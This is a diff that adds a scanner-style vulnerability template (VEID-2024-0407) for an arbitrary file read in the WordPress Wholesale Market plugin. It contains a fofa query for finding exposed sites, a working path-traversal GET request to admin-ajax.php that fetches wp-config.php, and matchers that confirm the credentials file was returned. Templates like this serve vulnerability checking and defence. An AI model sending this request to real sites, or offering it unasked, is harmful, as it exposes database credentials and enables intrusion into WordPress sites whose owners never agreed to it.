@@ -1,0 +1,26 @@
+## id: VEID-2024-0407
+## name: WordPress_Wholesale_Market插件存在任意文件读取漏洞
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2024
+## description: WordPress_Wholesale_Market插件存在任意文件读取
+## fofa-query: body="wp-content/plugins/wholesale-market"
+## verification: true
+
+
+GET /wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+
+#@ condition: and
+#@ matcher: header["Content-Type"] contains "log" && header["Content-Disposition"] contains "filename="wp-config.php""
+#@ matcher: body contains "<?php" && body contains "wp-config.php"
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: c9f8d99eaf8ded3a5c625f938e3aa28be45214e5898014068bc951ad9b3d24f3
